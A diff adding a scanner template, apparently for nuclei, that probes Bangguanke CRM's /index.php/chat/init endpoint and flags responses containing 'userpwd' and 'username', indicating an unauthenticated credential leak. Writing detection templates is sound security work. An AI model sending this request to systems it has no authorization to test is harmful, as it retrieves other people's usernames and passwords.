@@ -1,0 +1,26 @@
+id: bangguanke-chatinit-weak
+info:
+  name: bangguanke-chatinit-weak
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - http://wiki.fofamini.com/2023hw/%E5%B8%AE%E7%AE%A1%E5%AE%A2%20CRM%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /index.php/chat/init HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'userpwd'
+      - type: word
+        part: body
+        words:
+          - 'username'
